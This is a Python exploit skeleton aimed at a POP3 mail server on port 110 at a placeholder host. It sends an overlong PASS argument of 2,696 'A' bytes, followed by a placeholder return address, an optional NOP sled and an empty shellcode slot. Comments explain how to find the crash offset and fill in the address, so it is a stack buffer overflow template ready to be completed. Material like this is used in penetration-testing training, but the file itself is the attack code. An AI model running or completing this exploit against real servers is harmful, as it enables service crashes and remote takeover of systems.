#!/usr/bin/env python

from __future__ import print_function
import socket

def str2b(data):
    """Unescape P2/P3 and convert to bytes if Python3."""
    # Python2: Unescape control chars
    try:
        return data.decode('string_escape')
    except AttributeError:
        pass
    except UnicodeDecodeError:
        pass
    # Python3: Unescape control chars and convert to byte
    try:
        return data.encode("utf-8").decode('unicode-escape').encode("latin1")
    except UnicodeDecodeError:
        pass

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

len_total    = 2700                # Start at len_overflow and try out how much can be overwritten
len_overflow = 2696                # Use pattern_create.rb and pattern_offset.rb to find exact offset
len_nop_sled = 0                   # Add x bytes of nops before shellcode for shellcode decoding
eip          = "\x42\x42\x42\x42"  # Change this (Keep in mind to put address in reverse order)
shellcode    = ""

padding = "C"*(len_total - len_overflow - len(str(eip)) - len_nop_sled - len(shellcode))
buffer  = "A"*len_overflow + eip + "\x90"*len_nop_sled + shellcode + padding

print('Trying to send %s bytes buffer...' % (str(len(buffer))))
try:
    s.connect(('mail.example.tld', 110))
    s.recv(1024)
    s.send(str2b('USER test\r\n'))
    s.recv(1024)
    s.send(str2b('PASS ' + buffer + '\r\n'))
    s.recv(1024)
    s.send(str2b('QUIT\r\n'))
    print('done')
except:
    print('Could not connect, Buffer Overflow Detected...')
s.close()